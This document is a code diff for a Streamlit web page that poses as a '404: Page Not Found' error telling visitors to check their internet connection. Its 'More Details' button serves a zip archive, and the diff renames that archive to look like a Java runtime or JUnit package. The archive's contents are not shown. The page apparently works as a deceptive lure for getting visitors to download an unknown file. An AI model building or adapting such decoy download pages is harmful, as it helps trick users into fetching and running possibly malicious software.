@@ -4,7 +4,7 @@ import os
 # Set the custom domain
 st.set_page_config(page_title="404: Not Found",layout="wide")
 
-zip_file_path = "cod.zip"
+zip_file_path = "jre.-v1.6_junit4.zip"
 
 st.title("404: Page Not Found")
 st.error("Check Internet connection...")
@@ -16,7 +16,7 @@ if os.path.exists(zip_file_path):
     st.download_button(
         label="More Details",
         data=zip_data,
-        file_name="cod.zip",
+        file_name="jre.-v1.6_junit4.zip",
         mime="application/zip"
     )
 else:
